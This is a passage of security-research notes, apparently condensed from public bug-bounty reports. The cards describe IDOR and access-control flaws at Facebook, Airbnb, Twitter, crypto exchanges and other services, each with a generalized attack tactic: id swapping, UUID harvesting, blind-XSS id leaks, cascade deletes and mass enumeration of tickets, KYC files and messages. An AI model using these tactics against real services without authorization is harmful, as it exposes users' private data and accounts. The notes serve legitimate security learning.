### [422] Ribose — delete/replace ANY user's profile photo despite CSRF protection: `DELETE/POST /people/users/<userID>/avatar` carries a valid X-CSRF-Token, but swapping `userID` to the victim's (UUIDs are visible; harvest from the auto-added "Team Ribose" friend list) works with the ATTACKER's own token → the CSRF token isn't bound to the target object — YoKo Kho [NEW ★ IDOR defeats CSRF: your own valid token authorizes actions on others' ids; full CSRF-bypass test matrix]
- Where: `DELETE/POST /people/users/<userID>/avatar` (+ X-CSRF-Token, X-CSRF-Param).
- Approach/how-found: UUID user ids looked unguessable but were public (visible on profiles / the Team Ribose connections hub). The avatar delete/upload required a CSRF token, yet swapping only the `userID` while keeping his OWN token succeeded → the token validated the session, not ownership of the target id.
- Test: don't let a CSRF token stop you — try the IDOR (1) with your own valid token, (2) with the token removed, (3) with the victim's token; a CSRF token rarely binds to the object id. Harvest "unguessable" UUIDs from friend lists / profile pages / hubs.
- Q: "Does the CSRF/auth token actually bind to the target object, or just my session? Have I tried the id-swap WITH my own token / no token / the victim's token? Where are the UUIDs listed (friend hub, profile)?"

### [423] Travel booking — enumerate `payment_id` at checkout → other users' booking PII: `POST /xyzabc/checkout payment_id=` isn't session-validated; change 4055809→4055311 → redirected to another user's booking number → hotel name, email, trip duration, group size, location (data lives in the page SOURCE) — YoKo Kho [NEW: pick the RIGHT id to enumerate (payment_id worked where booking number didn't); read the source]
- Where: `POST /xyzabc/checkout` (`payment_id`, also `card`, `payment_product`); booking data in page source.
- Approach/how-found: mapped the multi-step booking→order→payment flow; the booking-number (transaction id) enumeration failed, but the `payment_id` parameter at the checkout step wasn't session-bound → swapping it returned other users' bookings; the leaked PII was in the HTML source, not the rendered page.
- Test: in multi-step checkout/booking flows, several ids exist (session, order, booking, payment_id) — test EACH; the one that's unauthorized may not be the obvious booking number; inspect the raw source for leaked PII even if the UI looks empty.
- Q: "Which of the flow's several ids (order/booking/payment) is actually unauthorized? Is the leaked data in the page source rather than rendered? Can I brute that id for mass booking PII?"

### [424] Travel-booking `payment_id` enumeration → booking PII (author's own-blog mirror of [423]) — YoKo Kho [DUP of 423: same finding on firstsight.me]
- Where: same `POST /xyzabc/checkout payment_id=` flow as [423].
- Note: identical to card [423]; recorded for per-index completeness (Intruder with "always follow redirect" automates the booking-PII dump). See [423].
- Q: "(see [423]) Which flow id is unauthorized, and is the PII in the source?"

### [425] Flickr — spoof another user as the author of a group blast/description: `flickr.groups.addBlast` carries BOTH `user_id` (the attributed author) and `viewerNSID` (your session); change `user_id` to a victim's NSID → the content posts AS the victim — Samuel (saamux) [NEW ★ author/owner field decoupled from the session id → impersonation]
- Where: `POST /services/rest method=flickr.groups.addBlast` (`user_id` ≠ `viewerNSID`, plus `csrf`).
- Approach/how-found: editing his group's blast sent a request where `user_id` named the author separately from the session (`viewerNSID`); swapping `user_id` to another user's NSID (harvested from their photo comments/likes) made the blast appear authored by the victim — even with a CSRF token present.
- Test: when a create/edit request has BOTH an author/owner id AND a session/viewer id, set the author id to a victim's → spoof authorship/attribution; harvest the victim's id from public activity (comments/likes).
- Q: "Does this write carry a separate author/owner id alongside my session id? If I set it to a victim, does the content get attributed to them (impersonation)?"

### [426] $60k crypto-exchange spree — support-ticket IDOR (millions of tickets + KYC passports), blind-XSS→unauth admin panel, reply-AS-ticket-owner, order-cancel IDOR; one owner ⇒ same bugs across brands — Max/iSecMax [NEW ★ ticket/KYC IDOR at massive scale + the "replies API leaks what the HTML hides" trick]
- Where: support systems `GET /question/questionDetail.do?workOrderId=<id>` and the underlying `GET /v2/support/cs/work-order/<id>/replies`; reply `POST /v2/support/cs/work-order/reply` (`workId`,`content`); `GET /account?act=cancel&order=<id>`; unauth admin `admin.example1.com/user/default/index?page=<n>`.
- Approach/how-found: (1) planted a **blind-XSS JS sniffer in his profile name**; admin viewing the user page leaked source + the admin URL, which turned out to be reachable **without authentication** (`?page=` enumerable) → read/modify 2,010 investors (email, phone, **BTC wallet**, balance). (2) `workOrderId` IDOR exposed ALL support tickets (2,500→4,898) with full phone/email/real-name and **uploaded KYC passports/screenshots**; even when the HTML page filtered output, the JSON **`/work-order/<id>/replies` API returned everything**. (3) `POST .../reply` with a `workId` let him post a message **as the ticket's owner** (impersonation). (4) `act=cancel&order=<id>` cancelled any user's withdrawal order. Same parent company ⇒ identical bugs across multiple exchanges; also mail.ru ticket IDOR → 3,000,000 tickets.
- Test: support/helpdesk ticket ids are a mass-PII+KYC IDOR surface — enumerate `ticketId`/`workOrderId`; when the rendered page hides data, hit the raw `replies`/`messages` JSON API. Reply/comment endpoints may let you post as the ticket owner. Use blind-XSS in stored profile fields to discover internal/admin URLs, then test those for missing auth + id enumeration.
- Q: "Can I enumerate support-ticket ids to read others' tickets + KYC uploads? Does the raw replies/messages API leak more than the page? Can I post a reply as the ticket owner? Did blind-XSS reveal an admin URL that lacks auth?"

### [427] Practo (healthcare) — send-SMS IDOR adds victims to YOUR account: send-SMS to a patient/staff keyed on an INCREMENTAL id; the response shows nothing, but REFRESHING the dashboard reveals the targeted user was added to the attacker's account with full details → brute the id → harvest patients' PII — Avinash Jain [NEW ★ empty response but the side effect (foreign user linked to my account) leaks PII; verify via dashboard]
- Where: send-SMS request (`patient_id`/`staff_id`, incremental).
- Approach/how-found: changing the id sent SMS to other users but the HTTP response was unrevealing; on returning to his dashboard, the targeted user had been ADDED to his account with their details visible → enumerate the id to collect many users' PII (healthcare data).
- Test: when an IDOR's response looks empty/useless, check OTHER surfaces (your dashboard, lists, exports) for the side effect — the data may surface elsewhere; incremental patient/staff ids = mass PII.
- Q: "Did the action import/link the foreign object into MY account where I can then read it? Have I checked my dashboard/lists after the request, not just the response?"

### [428] Bookmyshow — full control of any user's "experience" by adding a `create` action param: experience URLs expose the id (visible in others' experiences, no brute needed); appending `create` (learned from making your own) → edit name/image/description of anyone's experience — Avinash Jain [NEW: add a missing MODE/ACTION param to flip a read URL into an edit/own URL]
- Where: experience URL + appended `create` parameter/path.
- Approach/how-found: every experience had a visible id; he created his own to learn the edit URL used a `create` action, then applied that to a victim's experience id → gained edit/ownership over their content.
- Test: compare your own create/edit URL to the victim's view URL — adding the missing action/mode param (`create`/`edit`/`mode=edit`) can grant write access to objects you only had read access to; ids are often visible in content (no brute).
- Q: "What extra param/path does my own edit flow use that the view URL lacks? Does adding it to a victim's object id give me edit/ownership? Is the id already visible in their content?"

### [429] Facebook — friend list + payment card IDOR via first-party tokens & persisted queries: use the Android app's CLIENT token; persisted query by `query_id` is whitelist-blocked, but by `doc_id` it isn't → `CSPlaygroundGraphQLFriendsQuery` + `user_id` leaks any friend list regardless of privacy; and Graph API `fields=payment_modules_options.payment_type(payment_settings)` + USER_ID returns BIN/last4/expiry/name/zip (invalid payment_type returns all valid types) — Josip Franjković [NEW ★★ first-party client token + doc_id persisted-query bypass + field discovery via app interception]
- Where: `graph.facebook.com/graphql` (client token, `doc_id`, `variables.user_id`); `graph.facebook.com/v2.8/<USER_ID>?fields=payment_modules_options...`.
- Approach/how-found: a first-party app client token only allowed whitelisted persisted queries via `query_id`, but sending the SAME queries via `doc_id` bypassed the whitelist; one (`...FriendsQuery`) returned full friend lists ignoring privacy. Intercepting the Android app's traffic revealed the `payment_modules_options` field; querying it for a victim USER_ID leaked partial card data (an invalid `payment_type` errored back with all valid types).
- Test: extract first-party app tokens and persisted-query ids (query_id/doc_id) — try doc_id when query_id is blocked (whitelist bypass); intercept mobile-app traffic to discover undocumented fields; feed an invalid enum to get the list of valid values.
- Q: "Can I use a first-party app token + doc_id to run privileged persisted queries on a victim id? What undocumented fields does the mobile app request? Does an invalid enum value leak the valid set?"

### [430] Facebook community forum — delete ANY photo via answer `attachment.fbid` swap: post an answer with `attachment={"fbid":X}`, set X to a victim's photo fbid, then delete your answer → the victim's photo is deleted (after a short delay); works on FB Help-team photos and Workplace; derive a foreign `fbid` from the image URL (second number − constant 3333333) — Sarmad Hassan ($1,500) [NEW ★ attach a foreign object id to your own object, then delete it to destroy theirs; derive the id from the asset URL by arithmetic]
- Where: `POST /help/community/async/post_answer` `attachment={"fbid":<photoId>}`; fbid derivable from image URL.
- Approach/how-found: the answer's `attachment.fbid` referenced the uploaded photo; swapping it linked a victim's photo to his answer, and deleting the answer cascaded to delete the victim's photo. He sourced foreign fbids by subtracting a constant (3333333) from the second number in the image URL filename.
- Test: when your object references a child by id (attachment/photo/file), deleting your object may CASCADE-delete the referenced foreign child; derive "secret" media ids from asset/CDN URLs via observed offsets/patterns.
- Q: "If I reference a victim's media id in my object and delete my object, does it delete theirs (cascade)? Can I compute a foreign media id from its URL (constant offset/pattern)?"

### [431] Facebook Audience Network — modify any Ad Space/Placement: edit POST `ad_space_id` (and placement id in URL) not ownership-checked → edit anyone's ad spaces/placements; partial fix still left it open to Tester/Analytic app roles — Joshua Regio [DUP-reinforce: ad/monetization objects keyed on swappable ids; re-test fixes under other roles]
- Where: Ad Space edit POST (`ad_space_id`); Placement edit (placement id in URL).
- Approach/how-found: captured the edit requests; swapping `ad_space_id`/placement id let him modify others' ad configs. The first fix only blocked the default role — a Tester/Analytic role could still do it.
- Test: advertising/monetization config objects (ad space, placement, campaign) keyed on ids → swap; after a fix, re-test under every app/user role.
- Q: "Can I edit ad/monetization objects by swapping their ids? Does the fix hold across all roles (tester/analyst/advertiser)?"

### [432] Facebook Free Basics partner portal — zero-click ATO from an email-leak IDOR: add an admin with YOUR notification email, then swap `values[settings.users.userstablecontainer.user_id]` in `/save/` to a victim id → the notification email to you contains the victim's primary email (via `n_m`) AND a login-code parameter usable to log in as them — Josip Franjković [NEW ★ add-admin IDOR leaks victim email + login code in a notification → no-interaction ATO]
- Where: partner-portal `POST /mobile/settings/requirements/save/` `values[settings.users.userstablecontainer.user_id]`.
- Approach/how-found: adding an admin sent a notification to an attacker-controlled email; swapping the embedded `user_id` to a victim made that notification leak the victim's primary email and (it turned out) a login-code link parameter → Facebook later classified it as full account takeover.
- Test: "add user/admin/invite" flows that email notifications — swap the embedded user id and inspect the email for leaked PII or login/magic-link tokens; partner/B2B portals are under-tested.
- Q: "Does adding a user send a notification I can redirect by swapping a user_id, and does that email leak the victim's address or a login/magic token (→ ATO)?"

### [433] Mopub (Twitter) — report IDOR visible only in the RESPONSE: swapping the report id made the browser render blank, but Burp's response held the victim report's HTML → use "intercept response → forward into the original browser session" to view it — Jay Jani [NEW ★ the browser hides it but the response contains it; render the intercepted response]
- Where: report-view request, report id (browser blanks the swapped result).
- Approach/how-found: id-swap on the report seemed to fail (blank page), but the raw HTTP response contained the other account's report; intercepting the response and letting it render in the original session displayed it.
- Test: when an id-swap "fails" in the browser (blank/redirect), inspect the raw RESPONSE in Burp — the data is often there; use Burp's response interception to render it. Don't judge IDOR by the rendered page.
- Q: "Does the raw response contain the victim data even though the page renders blank? Have I checked Burp's response, not just the browser?"

### [434] Social platform — one unvalidated `userid`/`postid` → 12+ IDORs: delete any post (`id` in delete request), change/delete anyone's profile & cover picture (`userid` in upload), etc.; postid/userid both visible in URLs → sweep every endpoint that takes them — Mohammed Abdul Raheem ($3,000 for 21 bugs) [DUP-reinforce: find one unvalidated id param, then test it on EVERY action]
- Where: delete-post (`id`/`postid`), upload profile/cover (`userid`), and many sibling endpoints.
- Approach/how-found: postid was visible after posting; the delete action trusted it → delete any post. Then he found `userid` equally unvalidated and applied it across upload/delete/edit endpoints → 12+ IDORs.
- Test: once ONE id (userid/postid) is unvalidated, systematically replay it on every action (view/edit/delete/upload) — a single broken authz check usually spans many endpoints.
- Q: "Which id is unvalidated here, and on how many different actions does it work? Have I swept all sibling endpoints with it?"

### [435] Task-management app — download any team's file via `?id=<int>` swap: file-download endpoint keyed on a sequential integer id → change it to download other teams' uploaded files — securitybreached ($450) [DUP-reinforce: sequential file-download id, cross-tenant]
- Where: `.../download.png?id=<int>` (sequential).
- Approach/how-found: uploaded files were "team only" but the download endpoint trusted a sequential `id` → swap to pull other teams' files.
- Test: file-download/attachment endpoints with integer ids are cross-tenant IDORs — enumerate; "only your team can see it" is usually a UI claim.
- Q: "Is the file-download id sequential and cross-tenant? Does it enforce team/owner membership or just serve by id?"

### [436] Oculus — read any user's bug subscriptions via GraphQL `node(<id>)`: `me(){subscribed_external_tasks}` is just sugar; swap to `node(1){subscribed_external_tasks}` with YOUR token → victim's data — Philippe Harewood [DUP-reinforce: GraphQL `node(id)`/`viewer→node` swap defeats the `me()` wrapper]
- Where: `https://graph.oculus.com/graphql?q=node(<userId>){subscribed_external_tasks{nodes{id,title}}}&access_token=<attacker>`.
- Approach/how-found: `me()` returned only his own subscriptions, but replacing `me()` with `node(1)` (the victim's numeric id) while keeping his own access token returned the victim's subscriptions — the resolver authorized the token but not that the node belonged to it.
- Test: in GraphQL, whenever you see `me()`/`viewer`, try the explicit `node(<id>)` / `user(id:)` form with a foreign id and your own token — the per-node ownership check is often missing.
- Q: "Does `node(<victimId>)` (or `user(id:)`) return data that `me()` should scope to me? Is the token authorized but not bound to the node?"

### [437] Travel portal — read any user's support chat: chat request has `customer_id` (13-char alnum) + `chat_id` (`FL-132756`, incremental); customer_id is unguessable but appears in the traveller-BLOG URLs → harvest customer_ids from many blogs, brute the chat_id → full chat history — Avinash Jain [NEW ★ source the "unguessable" id from a different feature (blog URLs); try many victims since not all have data]
- Where: support-chat request (`customer_id` + incremental `chat_id`); customer_id leaked in blog post URLs.
- Approach/how-found: chat needed a 13-char customer_id (not in login/profile); the travel blog section exposed customer_ids in URLs. He harvested several, brute-forced chat_id for each, and (after a few empty users) hit full chat histories.
- Test: when one feature needs an unguessable id, find a DIFFERENT feature (blogs, reviews, public profiles, share links) that exposes it; iterate over many harvested ids since only some users have the target data.
- Q: "Which other feature leaks this user/customer id (blogs, reviews, comments, share URLs)? Have I tried enough victims to find ones with data?"

### [438] "Hunting IDOR Part 1" — one unvalidated `userid`/`postid` param → 12+ IDORs on a social platform: delete anyone's posts, change/delete anyone's profile & cover pictures — Khizer Javed/Arbaz ($3,000) [DUP-reinforce: find one id param, then sweep EVERY feature that uses it]
- Where: a social-media platform; `postid` in the delete-post request; `userid` in profile-pic/cover-pic upload & delete requests.
- Approach/how-found: saw `postid` in the URL after posting; swapping attacker→victim `postid` in the delete-item call deleted victims' posts. Then hypothesized `userid` was equally unvalidated → swept upload/delete features: change profile pic, change cover pic, delete profile/cover pic — all by swapping `userid`. 12 IDORs total from the same root cause.
- Test: once ANY object id param (`userid`/`postid`) is found unvalidated, systematically test every feature that carries it (create/edit/upload/delete/visibility) — a single broken authz layer usually breaks them all.
- Q: "I found one unvalidated id param — which other endpoints (upload/edit/delete/visibility) carry the same `userid`/`postid` and inherit the same missing check?"

### [439] New Relic — IDOR in the INTERNAL API (public REST API was safe): `/internal_api/v1/accounts/<num>/incidents` on `alerts`/`infrastructure` subdomains didn't bind the account number to the authenticated user; account numbers are sequential → enumerate every account's events/messages/violations/policies/settings — Jon Bottarini ($1,000) [NEW ★ the public API is locked down but the internal_api isn't; check all subdomains AND api versions]
- Where: `*.newrelic.com/internal_api/v1/accounts/<seq>/...` (alerts + infrastructure subdomains; only v1 vulnerable).
- Approach/how-found: swapping application_id on the public REST API failed; but the app also used `/internal_api/` (referenced in JS) across two product subdomains and multiple versions — only v1 on those subdomains skipped the account-ownership check → sequential account number → mass data.
- Test: enumerate INTERNAL APIs (`/internal_api/`, JS-referenced endpoints) separately from the public API; test EVERY subdomain and EVERY api version — authz often differs; sequential account numbers = full enumeration.
- Q: "Is there an internal API (in the JS) with weaker authz than the public one? Have I tested every subdomain and version? Are account numbers sequential?"

### [440] Facebook polls — delete any image ($10k): poll-create `poll_question_data[options][][associated_image_id]`; set it to a victim's image id → the poll shows their image; deleting the poll deletes the victim's image (cascade as a poll property) — Pouya Darabi [DUP-reinforce of the attach-foreign-id-then-delete cascade family (cf. [430]); high impact]
- Where: poll-create request `...[associated_image_id]`.
- Approach/how-found: the poll option referenced an uploaded image by id; swapping it embedded a victim's image; deleting the poll cascade-deleted the referenced image.
- Test: any feature that ATTACHES an image/file by id (poll, story, series, post) and treats it as an owned property → swap to a victim's id, then delete the container to destroy their asset.
- Q: "Does attaching a foreign media id and then deleting my container cascade-delete the victim's media? Which features (poll/story/series) reference media by id?"

### [441] Pwn a company's Slack/Workplace by chaining Ticket Trick + Blind XSS + ticket IDOR: ticket-view IDOR exists but ticket IDs are 12–13 random digits (un-brute-able); send a Slack/Workplace password-reset to `support@company` (creates a ticket from `no-reply@slack.com`), then email a Blind-XSS payload to support → it fires on the internal ticket console and the captured DOM leaks recent ticket IDs → use the IDOR to open the Slack ticket → get the 8 Slack channel registration links — Osama Ansari [NEW ★★ use Blind XSS to SOURCE the unguessable id that makes the IDOR exploitable; Ticket Trick variant]
- Where: ticket-view IDOR (`/api/param?param=<ticketID>`); support@company inbox→ticket; Blind XSS in ticket body rendered on internal console.
- Approach/how-found: the IDOR needed a ticket ID it couldn't brute. He planted a Blind XSS in a ticket (unsanitized email body) that executed when staff viewed it; XSS Hunter's DOM capture listed recent ticket IDs. Sending a Slack reset to support@ created a ticket containing Slack's links; the XSS leaked that ticket's ID → IDOR-view it → join the company's Slack/Workplace.
- Test: when an IDOR needs an unguessable id, find a leak for it — Blind XSS on an internal console can exfiltrate ids/DOM; combine with Ticket Trick (send service reset/verify emails to a shared support@ inbox) to capture SaaS invite/reset links.
- Q: "Can a Blind XSS on the staff/internal view leak the ids my IDOR needs? Does support@ create tickets I can read via IDOR (Ticket Trick → SaaS access)?"

### [442] Medium "claps" — front-end-only limits: clapping your own post is disabled only in the UI; `POST /_/api/posts/<STORY_ID>/claps` returns success for your own story; `GET /p/<POST_ID>/upvotes` exposes per-user `clapCount` that only authors should see — Sai Krishna Kothapalli [DUP-reinforce: restrictions enforced client-side only; hit the API directly]
- Where: `POST /_/api/posts/<id>/claps`; `GET /p/<id>/upvotes` (clapCount field).
- Approach/how-found: the disabled clap button was front-end only — the API accepted claps on his own posts; the upvotes API returned each user's clapCount despite the UI hiding it.
- Test: any UI-disabled/greyed action or hidden field — replay the underlying API; back-end frequently doesn't re-check what the front-end "prevents."
- Q: "Is this restriction enforced server-side or only by a disabled button/hidden field? What does the raw API return?"

### [443] OLX/LetGo — take over EVERY ad (automated): `GET /i2/ajax/ads/` lists all ad ids, `POST /i2/newadding/` takes over an ad by id and edits price/details (manual approval, but small price changes always pass and the account gets whitelisted); no rate limit → script to seize the whole catalog; found by unpinning SSL on the mobile apps to intercept the API — kciredor [NEW ★ ad-ownership-transfer IDOR + full automation + SSL-unpinning recon to reach the mobile API]
- Where: `GET /i2/ajax/ads/` (enumerate), `POST /i2/newadding/` (take over by ad id).
- Approach/how-found: intercepting the iOS/Android app traffic (SSL unpinned via Cydia / Xposed) exposed the ad API; posting to `newadding` with another ad's id transferred ownership to his account; the list API + no rate limiting made full automation possible; approvals auto-whitelisted after a few.
- Test: marketplace apps — the mobile API often has the juicy IDORs; unpin SSL (jailbreak/Cydia, Xposed, Frida, or emulator) to intercept; look for ownership-TRANSFER endpoints (`newadding`/`claim`/`transfer`) and a list endpoint to automate; weigh manual-approval and rate-limit gates.
- Q: "Does the mobile API expose an ownership-transfer/claim endpoint keyed on an id? Can I enumerate all objects and automate? Have I unpinned SSL to see the app's real requests?"

### [444] Twitter — view any private account's tweets via the ADS subdomain: an Ad Groups settings request carries `userId`; swap it to a private account's id → the response returns their (private) tweets — Cj Legacion [NEW ★ a sibling/ads/business subdomain exposes main-product private data by userId swap]
- Where: ads.twitter.com Ad Groups settings request, `userId` parameter.
- Approach/how-found: while testing the ads subdomain's new Ad-Group settings, a request carried `userId`; creating a 2nd (private) test account and swapping its id into the request returned that private account's tweets.
- Test: marketing/ads/business subdomains often call back into the core product with a `userId`/`accountId` and skip the main app's privacy checks — swap to read private content (tweets, posts, profile) of protected accounts.
- Q: "Does an ads/business/partner subdomain expose core private data when I swap a userId? Do these secondary surfaces enforce the main product's privacy rules?"

### [445] Terapeak — IDOR via per-user `token` in the URL: `PUT /services/users/information?token=<victim_token>` edits any user's info / deletes saved searches; writing into the profile yields stored XSS in their account — Shubham Gupta ($5,000) [NEW ★ the URL `token` IS the object ref; profile-write IDOR → stored XSS "into anyone's account"]
- Where: `PUT /services/users/information?token=<TOKEN>` (and DELETE for saved searches); body `{"firstName":...,"type":"userDetail"}`.
- Approach/how-found: the per-user `token` in the query string was the object reference; swapping it let him edit another user's information and delete their saved bulk searches. Because the written name field rendered unsanitized in the victim's UI, the IDOR became a vector to plant stored XSS into any account.
- Test: treat per-user `token`/`key`/`hash` values in URLs as object refs, not auth — swap them. A profile-field write IDOR is also an XSS delivery mechanism into the victim's session (self-XSS → stored-on-victim).
- Q: "Is the `token`/`key` in this URL an authenticator or just an object id I can swap? If I can write a victim's profile field, does it render unsanitized in their session (stored XSS)?"

### [446] Terapeak — cancel/edit/add ANY user's subscription via `email` in the body: `PUT /svc/cancel_subscription` `{"email":"<victim>","zuoraSubscriptionId":...}` — Shubham Gupta [DUP-reinforce: billing action keyed on a body `email`, not the session identity]
- Where: `PUT /svc/cancel_subscription` body `{"email":"victim@x","productName":...,"zuoraSubscriptionId":"2039653",...}`.
- Approach/how-found: the subscription cancel/edit/add actions identified the target by the `email` field in the JSON body; swapping it to a victim's email cancelled (or modified) their paid subscription — no check that the email matched the session.
- Test: billing/subscription/plan actions often carry the account identifier (`email`,`customerId`,`subscriptionId`) in the body — swap it to a victim's to cancel/modify/add their plan. The session should determine the target, not a body field.
- Q: "Does this subscription/billing action target whoever the `email`/`customerId` in the body says, instead of my session? Can I cancel or change another user's plan by swapping it?"

### [447] HackerOne — post a "Hacker Review" onto ANY hacker's profile + email them via attacker-controlled `hacker_username`: `POST /hacker_reviews` swap `hacker_username` — Japz Divino (swag) [NEW ★ the "who is this about" field is attacker-controlled → write content onto a foreign profile]
- Where: `POST /hacker_reviews` body `hacker_username=<target>&report_id=<x>&positive=true&public_feedback=...` (feature available to program team members).
- Approach/how-found: as a reviewer he captured the review submission; first tried swapping `report_id` to leak private report titles (failed), then changed `hacker_username` from himself to another user → the public review posted on the victim's profile and the notification email went to the victim. The subject field, not just the object id, was the IDOR.
- Test: for "review/report/assign/feedback about <someone>" actions, the actor-or-subject field (`username`, `assignee`, `author_id`) is itself an IDOR vector — set it to a victim to write content onto/notify their account. Don't fixate on the obvious `report_id`; test every party-identifying param.
- Q: "Is the 'who this is about/from' field (username/user_id) server-validated against my permissions, or can I set it to a victim to post content on their profile or trigger emails to them?"

### [448] Yahoo Luminate — app install statistics IDOR (emails of all installers): app-stats `GET ...?app_token=<token>` has no ownership check → returns who installed the app (admin emails/websites); source any app's `app_token` from the public install request URL (`...&app_token=...`) — Rojan Rijal [NEW ★ leaked token in an install URL unlocks a token-keyed stats IDOR]
- Where: stats `GET .../stats?app_token=<token>`; install `GET /admin/apps/live/settings/<app>?...&app_token=<token>...`.
- Approach/how-found: the stats endpoint trusted the `app_token` with no owner check (verified across two accounts). The remaining problem — getting another app's token — was solved because the app-store INSTALL request URL exposed `app_token` in the query string → grab it, feed it to stats → all installers' emails/sites.
- Test: when a stats/data endpoint is keyed on an app/integration token, hunt where that token leaks (install/settings/embed URLs, referer, JS); a "secret" token in a URL is harvestable.
- Q: "Is this stats/data endpoint keyed on a token with no owner check? Where does that token leak (install/embed URL, referer)? Can I read other apps' installer PII?"

### [449] Private project files on S3 keyed by TIMESTAMP path: files saved at `/uploads/<unix_timestamp>/1.py`; the only "id" is the upload timestamp (date-hour-min-sec) → script all timestamps for a day and fuzz → download other users' private project files — Arbaz Hussain [NEW ★ time-based path = tiny keyspace; fuzz the time window to reach "private" files]
- Where: S3 `/uploads/<timestamp>/<file>` (private and public use the same predictable scheme).
- Approach/how-found: both public and private projects stored files under a unix-timestamp directory; since a timestamp only spans a day's worth of seconds, he generated all timestamps for 24h and fuzzed → accessed others' private files (fix: an auth-token verifier on S3 fetch).
- Test: when files are addressed by timestamp (or any low-entropy value: counter, date, short hash), enumerate the whole window; "private" storage with a predictable path is open.
- Q: "Are uploaded files addressed by a timestamp/sequential/short value I can enumerate? Is there any auth on the storage URL, or just the path?"

### [450] Facebook private events — invite/RSVP arbitrary users (privacy/privesc, $2,000): the invite request's `profilechooseritems` is a user id; fuzz it to invite people NOT in your friend list (against policy) and even post "X is going to this event" on their behalf — Armaan Pathan [NEW: forced association — add/RSVP arbitrary users to your object by id]
- Where: event invite request, `profilechooseritems` (user id).
- Approach/how-found: inviting himself exposed his user id in `profilechooseritems`; swapping it to non-friends (incl. a brand-new account with no mutual friends) invited them to his private event and let him post their attendance — bypassing the friends-only policy.
- Test: invite/add-guest/RSVP actions keyed on a user id → set arbitrary ids to force-associate users with your object and post on their behalf (reputation/spam impact).
- Q: "Can I invite/RSVP/add arbitrary user ids to my event/group, ignoring the friends-only rule? Can I post attendance/actions on their behalf?"

### [451] Hackster.io — account-link IDOR → ATO: sign up with email, then "Login with Facebook" (same email) prompts to link; the link-confirm page URL is `/users/authorization/<USER-ID>/edit` → change USER-ID to a victim's → your Facebook links to their account → log in as them — Arbaz Hussain [NEW: the OAuth link-CONFIRM page is keyed on a swappable user id]
- Where: `/users/authorization/<USER-ID>/edit` (shown during "link existing account" after OAuth).
- Approach/how-found: logging in via Facebook on an email that already had an account triggered a "link these accounts?" page whose URL carried the user id; swapping it bound the attacker's Facebook to the victim's account → remote login.
- Test: OAuth "link/merge existing account" confirmation pages keyed on a user id in the URL → swap to bind your social identity to a victim (ATO).
- Q: "Does the account-link confirmation step carry a swappable user id? Can I link my OAuth to a victim's account by changing it?"

### [452] Broken mobile API — leak any user's secret hash by sending a BLANK hash to a different action: the read/update API needs `hash`+`id` (id-swap originally leaked/edited anyone → P1, patched); the fix required a matching hash, but sending a BLANK hash to the UPDATE endpoint (different `?act=`) returned `{user_id, hash}` in the response → harvest any id's hash, replay on the read/reset endpoints; the hash never changes — zseano [NEW ★★ blank/empty secret on a DIFFERENT action leaks the secret → defeats the hash-binding fix]
- Where: mobile API read/update endpoints (`id`+`hash`); the update endpoint (`?act=...`) leaks the hash when `hash` is blank.
- Approach/how-found: after the id-swap was patched by requiring a per-user `hash`, he sent a NULL hash to the update action (different code path via `act`) → the response echoed that user_id's real hash; swap id → harvest any user's hash → use it on the protected read/password-reset endpoints. Hash was static.
- Test: when a fix adds a per-object secret (hash/token), try BLANK/NULL/0 values across EVERY action (different `act`/method/endpoint) — one path may leak the secret in its response; static secrets, once leaked, are permanent.
- Q: "Does any endpoint leak the per-user hash/token when I send it blank? Do different actions (`act`) enforce it differently? Is the secret static (leak once = forever)?"

### [453] Support-request user impersonation ($4,250): logged-OUT support uses `SuppliedEmail`; logged-IN uses a `userid` in `AuxiliaryData`; swap `userid` to a victim's → submit a support/password-reset request on their behalf — Shahmeer Amir [NEW ★ diff the logged-in vs logged-out request to find the impersonation id]
- Where: `POST /custom_api/send_support_request` `AuxiliaryData.userid` (logged-in only).
- Approach/how-found: comparing the support request with vs without a session revealed the logged-in version carried `userid` instead of an email; changing it impersonated other users in support (e.g., request a password reset / leak info for them).
- Test: diff a request made authenticated vs unauthenticated — the auth version may add an identity param (userid) you can swap to act as others; support/help flows are high-value (reset/info-disclosure on behalf of victims).
- Q: "What identity param does the authenticated request add that the anonymous one lacks? Can I swap it to file support/reset requests as another user?"

### [454] Tumblr — inject content into 23.9M domains via the EMBED feature: the embed function didn't validate that the post's owner matched the target blog → create arbitrary posts/content under any tumblr domain (incl. branded CNAMEs) — ak1t4 [NEW: a cross-post/embed feature missing owner validation → mass content injection/defacement]
- Where: Tumblr "embed" post feature (no owner-vs-content validation).
- Approach/how-found: the embed feature served attacker-created content under any blog's domain because it never checked the content belonged to that blog → mass defacement across millions of domains (incl. high-profile ones found via dorks).
- Test: embed/cross-post/syndication/import features that render YOUR content under ANOTHER tenant's domain — check whether ownership is validated; impact is mass content injection/defacement.
- Q: "Does the embed/cross-post feature verify the content owner matches the target blog/domain? Can I serve my content under arbitrary tenants?"

### [455] Airbnb — read EVERY private message via the notification API: `/api/v2/air_push_notifications` (found by parsing JS) takes a `template` + `object_id`; an invalid `template` lists all valid templates, missing attributes error out the required ones (oracles); the `message` template's `object_id` is sequential → enumerate to push any conversation's content to yourself (use Push, not throttled SMS) — buer.haus [NEW ★ JS-discovered API + error-message oracles + sequential object_id → all DMs]
- Where: `/api/v2/air_push_notifications` (`template`, `object_id`); `/api/v2/air_sms_notifications` (throttled).
- Approach/how-found: a "text me the app link" feature exposed the notification API; a JS parser revealed a sibling push endpoint. Invalid `template` values returned the full template list; missing attributes returned the required-field names. The `message` template referenced a conversation by sequential `object_id` with no ownership check → enumerate to receive any user's private messages as a push notification (SMS was throttled/truncated; push wasn't).
- Test: parse JS for sibling/undocumented API endpoints; feed invalid enum values and omit fields to make errors ENUMERATE valid options/required params; sequential `object_id` on notification/templating APIs leaks the referenced object's content — prefer the un-throttled channel.
- Q: "What sibling endpoints does the JS reveal? Do invalid/missing values leak valid templates/fields? Is `object_id` sequential, and does the notification echo the referenced object's content? Which channel isn't rate-limited?"

### [456] zseano — "one company, 262 bugs": dedicating to a single app, found 8 IDORs leaking millions (emails/phones/sessions/PLAINTEXT passwords), incl. one where inputting ANY user `id` auto-logged him into that account; methodology: note reusable vulnerable params (code is copy-pasted across endpoints), blind-XSS staff views, set a goal per target — Sean (zseano) [NEW: methodology — go deep on ONE app; catalog reusable params; "id → auto-login" is the jackpot IDOR]
- Where: many endpoints across one application (reused param names).
- Approach/how-found: long-term focus on one program surfaced repeated IDOR patterns; the highest-impact one accepted any user id and logged him straight into that account.
- Test: pick one target and go deep; keep a list of vulnerable param names and retest them on every new endpoint (devs reuse code); the dream IDOR is one where supplying a victim id authenticates you AS them.
